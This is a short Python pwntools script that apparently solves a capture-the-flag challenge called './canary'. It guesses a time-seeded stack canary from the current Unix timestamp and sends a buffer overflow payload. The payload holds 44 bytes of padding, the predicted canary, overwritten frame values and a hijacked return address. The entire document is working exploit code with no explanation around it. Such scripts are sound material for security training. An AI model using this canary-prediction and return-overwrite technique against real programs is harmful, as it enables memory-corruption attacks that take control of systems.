from pwn import *

now = subprocess.Popen(["date", "+%s"], stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0]


target = process('./canary')
now = int(now)
nowBytes = now.to_bytes(4, 'little')
print("Now = ", hex(now))



print(target.recvuntil("how to win here?"))

payload = b'A'*(44)
payload += nowBytes
payload += p32(0xffffd080)
payload += p32(0x0804c000)
payload += p32(0xffffd098)
payload += p32(0x0804929a)
payload += nowBytes



target.sendline(payload)
print(target.recv())
print(target.recv())
#target.interactive()
target.close()


